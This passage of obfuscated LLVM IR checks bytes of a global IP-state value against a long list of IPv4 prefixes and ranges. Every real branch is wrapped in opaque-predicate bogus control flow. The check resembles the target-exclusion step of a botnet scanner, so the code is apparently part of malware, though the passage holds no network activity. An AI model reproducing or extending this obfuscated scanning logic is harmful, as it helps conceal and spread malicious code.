  %3307 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3308 = zext i8 %3307 to i32
  %3309 = icmp slt i32 %3308, 115
  %3310 = load i32, i32* @x.71
  %3311 = load i32, i32* @y.72
  %3312 = sub i32 %3310, 1
  %3313 = mul i32 %3310, %3312
  %3314 = urem i32 %3313, 2
  %3315 = icmp eq i32 %3314, 0
  %3316 = icmp slt i32 %3311, 10
  %3317 = or i1 %3315, %3316
  br i1 %3317, label %originalBBpart2436, label %originalBB434alteredBB

originalBBpart2436:                               ; preds = %originalBB434
  br i1 %3309, label %5042, label %3318

; <label>:3318:                                   ; preds = %originalBBpart2436, %3294, %3290, %3286
  %3319 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3320 = zext i8 %3319 to i32
  %3321 = icmp eq i32 %3320, 74
  br i1 %3321, label %3322, label %3334

; <label>:3322:                                   ; preds = %3318
  %3323 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3324 = zext i8 %3323 to i32
  %3325 = icmp eq i32 %3324, 201
  br i1 %3325, label %3326, label %3334

; <label>:3326:                                   ; preds = %3322
  %3327 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3328 = zext i8 %3327 to i32
  %3329 = icmp sge i32 %3328, 56
  br i1 %3329, label %3330, label %3334

; <label>:3330:                                   ; preds = %3326
  %3331 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3332 = zext i8 %3331 to i32
  %3333 = icmp slt i32 %3332, 58
  br i1 %3333, label %5042, label %3334

; <label>:3334:                                   ; preds = %3330, %3326, %3322, %3318
  %3335 = load i32, i32* @x.71
  %3336 = load i32, i32* @y.72
  %3337 = sub i32 %3335, 1
  %3338 = mul i32 %3335, %3337
  %3339 = urem i32 %3338, 2
  %3340 = icmp eq i32 %3339, 0
  %3341 = icmp slt i32 %3336, 10
  %3342 = or i1 %3340, %3341
  br i1 %3342, label %originalBB438, label %originalBB438alteredBB

originalBB438:                                    ; preds = %originalBB438alteredBB, %3334
  %3343 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3344 = zext i8 %3343 to i32
  %3345 = icmp eq i32 %3344, 188
  %3346 = load i32, i32* @x.71
  %3347 = load i32, i32* @y.72
  %3348 = sub i32 %3346, 1
  %3349 = mul i32 %3346, %3348
  %3350 = urem i32 %3349, 2
  %3351 = icmp eq i32 %3350, 0
  %3352 = icmp slt i32 %3347, 10
  %3353 = or i1 %3351, %3352
  br i1 %3353, label %originalBBpart2440, label %originalBB438alteredBB

originalBBpart2440:                               ; preds = %originalBB438
  br i1 %3345, label %3354, label %3382

; <label>:3354:                                   ; preds = %originalBBpart2440
  %3355 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3356 = zext i8 %3355 to i32
  %3357 = icmp eq i32 %3356, 209
  br i1 %3357, label %3358, label %3382

; <label>:3358:                                   ; preds = %3354
  %3359 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3360 = zext i8 %3359 to i32
  %3361 = icmp sge i32 %3360, 48
  br i1 %3361, label %3362, label %3382

; <label>:3362:                                   ; preds = %3358
  %3363 = load i32, i32* @x.71
  %3364 = load i32, i32* @y.72
  %3365 = sub i32 %3363, 1
  %3366 = mul i32 %3363, %3365
  %3367 = urem i32 %3366, 2
  %3368 = icmp eq i32 %3367, 0
  %3369 = icmp slt i32 %3364, 10
  %3370 = or i1 %3368, %3369
  br i1 %3370, label %originalBB442, label %originalBB442alteredBB

originalBB442:                                    ; preds = %originalBB442alteredBB, %3362
  %3371 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3372 = zext i8 %3371 to i32
  %3373 = icmp slt i32 %3372, 53
  %3374 = load i32, i32* @x.71
  %3375 = load i32, i32* @y.72
  %3376 = sub i32 %3374, 1
  %3377 = mul i32 %3374, %3376
  %3378 = urem i32 %3377, 2
  %3379 = icmp eq i32 %3378, 0
  %3380 = icmp slt i32 %3375, 10
  %3381 = or i1 %3379, %3380
  br i1 %3381, label %originalBBpart2444, label %originalBB442alteredBB

originalBBpart2444:                               ; preds = %originalBB442
  br i1 %3373, label %5042, label %3382

; <label>:3382:                                   ; preds = %originalBBpart2444, %3358, %3354, %originalBBpart2440
  %3383 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3384 = zext i8 %3383 to i32
  %3385 = icmp eq i32 %3384, 188
  br i1 %3385, label %3386, label %3406

; <label>:3386:                                   ; preds = %3382
  %3387 = load i32, i32* @x.71
  %3388 = load i32, i32* @y.72
  %3389 = sub i32 %3387, 1
  %3390 = mul i32 %3387, %3389
  %3391 = urem i32 %3390, 2
  %3392 = icmp eq i32 %3391, 0
  %3393 = icmp slt i32 %3388, 10
  %3394 = or i1 %3392, %3393
  br i1 %3394, label %originalBB446, label %originalBB446alteredBB

originalBB446:                                    ; preds = %originalBB446alteredBB, %3386
  %3395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3396 = zext i8 %3395 to i32
  %3397 = icmp eq i32 %3396, 165
  %3398 = load i32, i32* @x.71
  %3399 = load i32, i32* @y.72
  %3400 = sub i32 %3398, 1
  %3401 = mul i32 %3398, %3400
  %3402 = urem i32 %3401, 2
  %3403 = icmp eq i32 %3402, 0
  %3404 = icmp slt i32 %3399, 10
  %3405 = or i1 %3403, %3404
  br i1 %3405, label %originalBBpart2448, label %originalBB446alteredBB

originalBBpart2448:                               ; preds = %originalBB446
  br i1 %3397, label %5042, label %3406

; <label>:3406:                                   ; preds = %originalBBpart2448, %3382
  %3407 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3408 = zext i8 %3407 to i32
  %3409 = icmp eq i32 %3408, 149
  br i1 %3409, label %3410, label %3414

; <label>:3410:                                   ; preds = %3406
  %3411 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3412 = zext i8 %3411 to i32
  %3413 = icmp eq i32 %3412, 202
  br i1 %3413, label %5042, label %3414

; <label>:3414:                                   ; preds = %3410, %3406
  %3415 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3416 = zext i8 %3415 to i32
  %3417 = icmp eq i32 %3416, 151
  br i1 %3417, label %3418, label %3422

; <label>:3418:                                   ; preds = %3414
  %3419 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3420 = zext i8 %3419 to i32
  %3421 = icmp eq i32 %3420, 80
  br i1 %3421, label %5042, label %3422

; <label>:3422:                                   ; preds = %3418, %3414
  %3423 = load i32, i32* @x.71
  %3424 = load i32, i32* @y.72
  %3425 = sub i32 %3423, 1
  %3426 = mul i32 %3423, %3425
  %3427 = urem i32 %3426, 2
  %3428 = icmp eq i32 %3427, 0
  %3429 = icmp slt i32 %3424, 10
  %3430 = or i1 %3428, %3429
  br i1 %3430, label %originalBB450, label %originalBB450alteredBB

originalBB450:                                    ; preds = %originalBB450alteredBB, %3422
  %3431 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3432 = zext i8 %3431 to i32
  %3433 = icmp eq i32 %3432, 164
  %3434 = load i32, i32* @x.71
  %3435 = load i32, i32* @y.72
  %3436 = sub i32 %3434, 1
  %3437 = mul i32 %3434, %3436
  %3438 = urem i32 %3437, 2
  %3439 = icmp eq i32 %3438, 0
  %3440 = icmp slt i32 %3435, 10
  %3441 = or i1 %3439, %3440
  br i1 %3441, label %originalBBpart2452, label %originalBB450alteredBB

originalBBpart2452:                               ; preds = %originalBB450
  br i1 %3433, label %3442, label %3446

; <label>:3442:                                   ; preds = %originalBBpart2452
  %3443 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3444 = zext i8 %3443 to i32
  %3445 = icmp eq i32 %3444, 132
  br i1 %3445, label %5042, label %3446

; <label>:3446:                                   ; preds = %3442, %originalBBpart2452
  %3447 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3448 = zext i8 %3447 to i32
  %3449 = icmp eq i32 %3448, 176
  br i1 %3449, label %3450, label %3470

; <label>:3450:                                   ; preds = %3446
  %3451 = load i32, i32* @x.71
  %3452 = load i32, i32* @y.72
  %3453 = sub i32 %3451, 1
  %3454 = mul i32 %3451, %3453
  %3455 = urem i32 %3454, 2
  %3456 = icmp eq i32 %3455, 0
  %3457 = icmp slt i32 %3452, 10
  %3458 = or i1 %3456, %3457
  br i1 %3458, label %originalBB454, label %originalBB454alteredBB

originalBB454:                                    ; preds = %originalBB454alteredBB, %3450
  %3459 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3460 = zext i8 %3459 to i32
  %3461 = icmp eq i32 %3460, 31
  %3462 = load i32, i32* @x.71
  %3463 = load i32, i32* @y.72
  %3464 = sub i32 %3462, 1
  %3465 = mul i32 %3462, %3464
  %3466 = urem i32 %3465, 2
  %3467 = icmp eq i32 %3466, 0
  %3468 = icmp slt i32 %3463, 10
  %3469 = or i1 %3467, %3468
  br i1 %3469, label %originalBBpart2456, label %originalBB454alteredBB

originalBBpart2456:                               ; preds = %originalBB454
  br i1 %3461, label %5042, label %3470

; <label>:3470:                                   ; preds = %originalBBpart2456, %3446
  %3471 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3472 = zext i8 %3471 to i32
  %3473 = icmp eq i32 %3472, 167
  br i1 %3473, label %3474, label %3494

; <label>:3474:                                   ; preds = %3470
  %3475 = load i32, i32* @x.71
  %3476 = load i32, i32* @y.72
  %3477 = sub i32 %3475, 1
  %3478 = mul i32 %3475, %3477
  %3479 = urem i32 %3478, 2
  %3480 = icmp eq i32 %3479, 0
  %3481 = icmp slt i32 %3476, 10
  %3482 = or i1 %3480, %3481
  br i1 %3482, label %originalBB458, label %originalBB458alteredBB

originalBB458:                                    ; preds = %originalBB458alteredBB, %3474
  %3483 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3484 = zext i8 %3483 to i32
  %3485 = icmp eq i32 %3484, 114
  %3486 = load i32, i32* @x.71
  %3487 = load i32, i32* @y.72
  %3488 = sub i32 %3486, 1
  %3489 = mul i32 %3486, %3488
  %3490 = urem i32 %3489, 2
  %3491 = icmp eq i32 %3490, 0
  %3492 = icmp slt i32 %3487, 10
  %3493 = or i1 %3491, %3492
  br i1 %3493, label %originalBBpart2460, label %originalBB458alteredBB

originalBBpart2460:                               ; preds = %originalBB458
  br i1 %3485, label %5042, label %3494

; <label>:3494:                                   ; preds = %originalBBpart2460, %3470
  %3495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3496 = zext i8 %3495 to i32
  %3497 = icmp eq i32 %3496, 178
  br i1 %3497, label %3498, label %3502

; <label>:3498:                                   ; preds = %3494
  %3499 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3500 = zext i8 %3499 to i32
  %3501 = icmp eq i32 %3500, 32
  br i1 %3501, label %5042, label %3502

; <label>:3502:                                   ; preds = %3498, %3494
  %3503 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3504 = zext i8 %3503 to i32
  %3505 = icmp eq i32 %3504, 178
  br i1 %3505, label %3506, label %3526

; <label>:3506:                                   ; preds = %3502
  %3507 = load i32, i32* @x.71
  %3508 = load i32, i32* @y.72
  %3509 = sub i32 %3507, 1
  %3510 = mul i32 %3507, %3509
  %3511 = urem i32 %3510, 2
  %3512 = icmp eq i32 %3511, 0
  %3513 = icmp slt i32 %3508, 10
  %3514 = or i1 %3512, %3513
  br i1 %3514, label %originalBB462, label %originalBB462alteredBB

originalBB462:                                    ; preds = %originalBB462alteredBB, %3506
  %3515 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3516 = zext i8 %3515 to i32
  %3517 = icmp eq i32 %3516, 33
  %3518 = load i32, i32* @x.71
  %3519 = load i32, i32* @y.72
  %3520 = sub i32 %3518, 1
  %3521 = mul i32 %3518, %3520
  %3522 = urem i32 %3521, 2
  %3523 = icmp eq i32 %3522, 0
  %3524 = icmp slt i32 %3519, 10
  %3525 = or i1 %3523, %3524
  br i1 %3525, label %originalBBpart2464, label %originalBB462alteredBB

originalBBpart2464:                               ; preds = %originalBB462
  br i1 %3517, label %5042, label %3526

; <label>:3526:                                   ; preds = %originalBBpart2464, %3502
  %3527 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3528 = zext i8 %3527 to i32
  %3529 = icmp eq i32 %3528, 37
  br i1 %3529, label %3530, label %3534

; <label>:3530:                                   ; preds = %3526
  %3531 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3532 = zext i8 %3531 to i32
  %3533 = icmp eq i32 %3532, 59
  br i1 %3533, label %5042, label %3534

; <label>:3534:                                   ; preds = %3530, %3526
  %3535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3536 = zext i8 %3535 to i32
  %3537 = icmp eq i32 %3536, 37
  br i1 %3537, label %3538, label %3542

; <label>:3538:                                   ; preds = %3534
  %3539 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3540 = zext i8 %3539 to i32
  %3541 = icmp eq i32 %3540, 187
  br i1 %3541, label %5042, label %3542

; <label>:3542:                                   ; preds = %3538, %3534
  %3543 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3544 = zext i8 %3543 to i32
  %3545 = icmp eq i32 %3544, 46
  br i1 %3545, label %3546, label %3550

; <label>:3546:                                   ; preds = %3542
  %3547 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3548 = zext i8 %3547 to i32
  %3549 = icmp eq i32 %3548, 105
  br i1 %3549, label %5042, label %3550

; <label>:3550:                                   ; preds = %3546, %3542
  %3551 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3552 = zext i8 %3551 to i32
  %3553 = icmp eq i32 %3552, 51
  br i1 %3553, label %3554, label %3558

; <label>:3554:                                   ; preds = %3550
  %3555 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3556 = zext i8 %3555 to i32
  %3557 = icmp eq i32 %3556, 254
  br i1 %3557, label %5042, label %3558

; <label>:3558:                                   ; preds = %3554, %3550
  %3559 = load i32, i32* @x.71
  %3560 = load i32, i32* @y.72
  %3561 = sub i32 %3559, 1
  %3562 = mul i32 %3559, %3561
  %3563 = urem i32 %3562, 2
  %3564 = icmp eq i32 %3563, 0
  %3565 = icmp slt i32 %3560, 10
  %3566 = or i1 %3564, %3565
  br i1 %3566, label %originalBB466, label %originalBB466alteredBB

originalBB466:                                    ; preds = %originalBB466alteredBB, %3558
  %3567 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3568 = zext i8 %3567 to i32
  %3569 = icmp eq i32 %3568, 51
  %3570 = load i32, i32* @x.71
  %3571 = load i32, i32* @y.72
  %3572 = sub i32 %3570, 1
  %3573 = mul i32 %3570, %3572
  %3574 = urem i32 %3573, 2
  %3575 = icmp eq i32 %3574, 0
  %3576 = icmp slt i32 %3571, 10
  %3577 = or i1 %3575, %3576
  br i1 %3577, label %originalBBpart2468, label %originalBB466alteredBB

originalBBpart2468:                               ; preds = %originalBB466
  br i1 %3569, label %3578, label %3598

; <label>:3578:                                   ; preds = %originalBBpart2468
  %3579 = load i32, i32* @x.71
  %3580 = load i32, i32* @y.72
  %3581 = sub i32 %3579, 1
  %3582 = mul i32 %3579, %3581
  %3583 = urem i32 %3582, 2
  %3584 = icmp eq i32 %3583, 0
  %3585 = icmp slt i32 %3580, 10
  %3586 = or i1 %3584, %3585
  br i1 %3586, label %originalBB470, label %originalBB470alteredBB

originalBB470:                                    ; preds = %originalBB470alteredBB, %3578
  %3587 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3588 = zext i8 %3587 to i32
  %3589 = icmp eq i32 %3588, 255
  %3590 = load i32, i32* @x.71
  %3591 = load i32, i32* @y.72
  %3592 = sub i32 %3590, 1
  %3593 = mul i32 %3590, %3592
  %3594 = urem i32 %3593, 2
  %3595 = icmp eq i32 %3594, 0
  %3596 = icmp slt i32 %3591, 10
  %3597 = or i1 %3595, %3596
  br i1 %3597, label %originalBBpart2472, label %originalBB470alteredBB

originalBBpart2472:                               ; preds = %originalBB470
  br i1 %3589, label %5042, label %3598

; <label>:3598:                                   ; preds = %originalBBpart2472, %originalBBpart2468
  %3599 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3600 = zext i8 %3599 to i32
  %3601 = icmp eq i32 %3600, 5
  br i1 %3601, label %3602, label %3606

; <label>:3602:                                   ; preds = %3598
  %3603 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3604 = zext i8 %3603 to i32
  %3605 = icmp eq i32 %3604, 135
  br i1 %3605, label %5042, label %3606

; <label>:3606:                                   ; preds = %3602, %3598
  %3607 = load i32, i32* @x.71
  %3608 = load i32, i32* @y.72
  %3609 = sub i32 %3607, 1
  %3610 = mul i32 %3607, %3609
  %3611 = urem i32 %3610, 2
  %3612 = icmp eq i32 %3611, 0
  %3613 = icmp slt i32 %3608, 10
  %3614 = or i1 %3612, %3613
  br i1 %3614, label %originalBB474, label %originalBB474alteredBB

originalBB474:                                    ; preds = %originalBB474alteredBB, %3606
  %3615 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3616 = zext i8 %3615 to i32
  %3617 = icmp eq i32 %3616, 5
  %3618 = load i32, i32* @x.71
  %3619 = load i32, i32* @y.72
  %3620 = sub i32 %3618, 1
  %3621 = mul i32 %3618, %3620
  %3622 = urem i32 %3621, 2
  %3623 = icmp eq i32 %3622, 0
  %3624 = icmp slt i32 %3619, 10
  %3625 = or i1 %3623, %3624
  br i1 %3625, label %originalBBpart2476, label %originalBB474alteredBB

originalBBpart2476:                               ; preds = %originalBB474
  br i1 %3617, label %3626, label %3646

; <label>:3626:                                   ; preds = %originalBBpart2476
  %3627 = load i32, i32* @x.71
  %3628 = load i32, i32* @y.72
  %3629 = sub i32 %3627, 1
  %3630 = mul i32 %3627, %3629
  %3631 = urem i32 %3630, 2
  %3632 = icmp eq i32 %3631, 0
  %3633 = icmp slt i32 %3628, 10
  %3634 = or i1 %3632, %3633
  br i1 %3634, label %originalBB478, label %originalBB478alteredBB

originalBB478:                                    ; preds = %originalBB478alteredBB, %3626
  %3635 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3636 = zext i8 %3635 to i32
  %3637 = icmp eq i32 %3636, 196
  %3638 = load i32, i32* @x.71
  %3639 = load i32, i32* @y.72
  %3640 = sub i32 %3638, 1
  %3641 = mul i32 %3638, %3640
  %3642 = urem i32 %3641, 2
  %3643 = icmp eq i32 %3642, 0
  %3644 = icmp slt i32 %3639, 10
  %3645 = or i1 %3643, %3644
  br i1 %3645, label %originalBBpart2480, label %originalBB478alteredBB

originalBBpart2480:                               ; preds = %originalBB478
  br i1 %3637, label %5042, label %3646

; <label>:3646:                                   ; preds = %originalBBpart2480, %originalBBpart2476
  %3647 = load i32, i32* @x.71
  %3648 = load i32, i32* @y.72
  %3649 = sub i32 %3647, 1
  %3650 = mul i32 %3647, %3649
  %3651 = urem i32 %3650, 2
  %3652 = icmp eq i32 %3651, 0
  %3653 = icmp slt i32 %3648, 10
  %3654 = or i1 %3652, %3653
  br i1 %3654, label %originalBB482, label %originalBB482alteredBB

originalBB482:                                    ; preds = %originalBB482alteredBB, %3646
  %3655 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3656 = zext i8 %3655 to i32
  %3657 = icmp eq i32 %3656, 5
  %3658 = load i32, i32* @x.71
  %3659 = load i32, i32* @y.72
  %3660 = sub i32 %3658, 1
  %3661 = mul i32 %3658, %3660
  %3662 = urem i32 %3661, 2
  %3663 = icmp eq i32 %3662, 0
  %3664 = icmp slt i32 %3659, 10
  %3665 = or i1 %3663, %3664
  br i1 %3665, label %originalBBpart2484, label %originalBB482alteredBB

originalBBpart2484:                               ; preds = %originalBB482
  br i1 %3657, label %3666, label %3670

; <label>:3666:                                   ; preds = %originalBBpart2484
  %3667 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3668 = zext i8 %3667 to i32
  %3669 = icmp eq i32 %3668, 39
  br i1 %3669, label %5042, label %3670

; <label>:3670:                                   ; preds = %3666, %originalBBpart2484
  %3671 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3672 = zext i8 %3671 to i32
  %3673 = icmp eq i32 %3672, 91
  br i1 %3673, label %3674, label %3694

; <label>:3674:                                   ; preds = %3670
  %3675 = load i32, i32* @x.71
  %3676 = load i32, i32* @y.72
  %3677 = sub i32 %3675, 1
  %3678 = mul i32 %3675, %3677
  %3679 = urem i32 %3678, 2
  %3680 = icmp eq i32 %3679, 0
  %3681 = icmp slt i32 %3676, 10
  %3682 = or i1 %3680, %3681
  br i1 %3682, label %originalBB486, label %originalBB486alteredBB

originalBB486:                                    ; preds = %originalBB486alteredBB, %3674
  %3683 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3684 = zext i8 %3683 to i32
  %3685 = icmp eq i32 %3684, 134
  %3686 = load i32, i32* @x.71
  %3687 = load i32, i32* @y.72
  %3688 = sub i32 %3686, 1
  %3689 = mul i32 %3686, %3688
  %3690 = urem i32 %3689, 2
  %3691 = icmp eq i32 %3690, 0
  %3692 = icmp slt i32 %3687, 10
  %3693 = or i1 %3691, %3692
  br i1 %3693, label %originalBBpart2488, label %originalBB486alteredBB

originalBBpart2488:                               ; preds = %originalBB486
  br i1 %3685, label %5042, label %3694

; <label>:3694:                                   ; preds = %originalBBpart2488, %3670
  %3695 = load i32, i32* @x.71
  %3696 = load i32, i32* @y.72
  %3697 = sub i32 %3695, 1
  %3698 = mul i32 %3695, %3697
  %3699 = urem i32 %3698, 2
  %3700 = icmp eq i32 %3699, 0
  %3701 = icmp slt i32 %3696, 10
  %3702 = or i1 %3700, %3701
  br i1 %3702, label %originalBB490, label %originalBB490alteredBB

originalBB490:                                    ; preds = %originalBB490alteredBB, %3694
  %3703 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3704 = zext i8 %3703 to i32
  %3705 = icmp eq i32 %3704, 104
  %3706 = load i32, i32* @x.71
  %3707 = load i32, i32* @y.72
  %3708 = sub i32 %3706, 1
  %3709 = mul i32 %3706, %3708
  %3710 = urem i32 %3709, 2
  %3711 = icmp eq i32 %3710, 0
  %3712 = icmp slt i32 %3707, 10
  %3713 = or i1 %3711, %3712
  br i1 %3713, label %originalBBpart2492, label %originalBB490alteredBB

originalBBpart2492:                               ; preds = %originalBB490
  br i1 %3705, label %3714, label %3742

; <label>:3714:                                   ; preds = %originalBBpart2492
  %3715 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3716 = zext i8 %3715 to i32
  %3717 = icmp eq i32 %3716, 200
  br i1 %3717, label %3718, label %3742

; <label>:3718:                                   ; preds = %3714
  %3719 = load i32, i32* @x.71
  %3720 = load i32, i32* @y.72
  %3721 = sub i32 %3719, 1
  %3722 = mul i32 %3719, %3721
  %3723 = urem i32 %3722, 2
  %3724 = icmp eq i32 %3723, 0
  %3725 = icmp slt i32 %3720, 10
  %3726 = or i1 %3724, %3725
  br i1 %3726, label %originalBB494, label %originalBB494alteredBB

originalBB494:                                    ; preds = %originalBB494alteredBB, %3718
  %3727 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3728 = zext i8 %3727 to i32
  %3729 = icmp sge i32 %3728, 128
  %3730 = load i32, i32* @x.71
  %3731 = load i32, i32* @y.72
  %3732 = sub i32 %3730, 1
  %3733 = mul i32 %3730, %3732
  %3734 = urem i32 %3733, 2
  %3735 = icmp eq i32 %3734, 0
  %3736 = icmp slt i32 %3731, 10
  %3737 = or i1 %3735, %3736
  br i1 %3737, label %originalBBpart2496, label %originalBB494alteredBB

originalBBpart2496:                               ; preds = %originalBB494
  br i1 %3729, label %3738, label %3742

; <label>:3738:                                   ; preds = %originalBBpart2496
  %3739 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3740 = zext i8 %3739 to i32
  %3741 = icmp slt i32 %3740, 159
  br i1 %3741, label %5042, label %3742

; <label>:3742:                                   ; preds = %3738, %originalBBpart2496, %3714, %originalBBpart2492
  %3743 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3744 = zext i8 %3743 to i32
  %3745 = icmp eq i32 %3744, 107
  br i1 %3745, label %3746, label %3758

; <label>:3746:                                   ; preds = %3742
  %3747 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3748 = zext i8 %3747 to i32
  %3749 = icmp eq i32 %3748, 152
  br i1 %3749, label %3750, label %3758

; <label>:3750:                                   ; preds = %3746
  %3751 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3752 = zext i8 %3751 to i32
  %3753 = icmp sge i32 %3752, 96
  br i1 %3753, label %3754, label %3758

; <label>:3754:                                   ; preds = %3750
  %3755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3756 = zext i8 %3755 to i32
  %3757 = icmp slt i32 %3756, 111
  br i1 %3757, label %5042, label %3758

; <label>:3758:                                   ; preds = %3754, %3750, %3746, %3742
  %3759 = load i32, i32* @x.71
  %3760 = load i32, i32* @y.72
  %3761 = sub i32 %3759, 1
  %3762 = mul i32 %3759, %3761
  %3763 = urem i32 %3762, 2
  %3764 = icmp eq i32 %3763, 0
  %3765 = icmp slt i32 %3760, 10
  %3766 = or i1 %3764, %3765
  br i1 %3766, label %originalBB498, label %originalBB498alteredBB

originalBB498:                                    ; preds = %originalBB498alteredBB, %3758
  %3767 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3768 = zext i8 %3767 to i32
  %3769 = icmp eq i32 %3768, 107
  %3770 = load i32, i32* @x.71
  %3771 = load i32, i32* @y.72
  %3772 = sub i32 %3770, 1
  %3773 = mul i32 %3770, %3772
  %3774 = urem i32 %3773, 2
  %3775 = icmp eq i32 %3774, 0
  %3776 = icmp slt i32 %3771, 10
  %3777 = or i1 %3775, %3776
  br i1 %3777, label %originalBBpart2500, label %originalBB498alteredBB

originalBBpart2500:                               ; preds = %originalBB498
  br i1 %3769, label %3778, label %3790

; <label>:3778:                                   ; preds = %originalBBpart2500
  %3779 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3780 = zext i8 %3779 to i32
  %3781 = icmp eq i32 %3780, 181
  br i1 %3781, label %3782, label %3790

; <label>:3782:                                   ; preds = %3778
  %3783 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3784 = zext i8 %3783 to i32
  %3785 = icmp sge i32 %3784, 160
  br i1 %3785, label %3786, label %3790

; <label>:3786:                                   ; preds = %3782
  %3787 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3788 = zext i8 %3787 to i32
  %3789 = icmp slt i32 %3788, 189
  br i1 %3789, label %5042, label %3790

; <label>:3790:                                   ; preds = %3786, %3782, %3778, %originalBBpart2500
  %3791 = load i32, i32* @x.71
  %3792 = load i32, i32* @y.72
  %3793 = sub i32 %3791, 1
  %3794 = mul i32 %3791, %3793
  %3795 = urem i32 %3794, 2
  %3796 = icmp eq i32 %3795, 0
